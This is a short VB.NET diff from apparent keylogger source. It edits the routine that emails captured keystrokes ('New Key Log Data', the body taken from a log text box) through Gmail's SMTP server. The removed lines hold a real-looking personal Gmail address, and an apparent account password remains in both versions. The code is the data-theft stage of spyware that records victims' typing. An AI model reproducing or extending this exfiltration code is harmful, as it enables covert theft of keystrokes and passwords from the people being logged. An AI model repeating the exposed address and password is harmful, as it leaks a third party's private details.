@@ -8,12 +8,12 @@ Public Class Form1
             smtpserver.EnableSsl = True
             Dim mail As New MailMessage
 
-            smtpserver.Credentials = New Net.NetworkCredential("nithin.reddy344@gmail.com", "8186821765")
+            smtpserver.Credentials = New Net.NetworkCredential("abc.com", "8186821765")
             smtpserver.Port = 587
             smtpserver.Host = "smtp.gmail.com"
             mail = New MailMessage
-            mail.From = New MailAddress("nithin.reddy344@gmail.com")
-            mail.To.Add("nithin.reddy344@gmail.com")
+            mail.From = New MailAddress("abc@gmail.com")
+            mail.To.Add("abc@gmail.com")
             mail.Subject = ("New Key Log Data")
             mail.Body = txtlogs.Text()
             smtpserver.Send(mail)
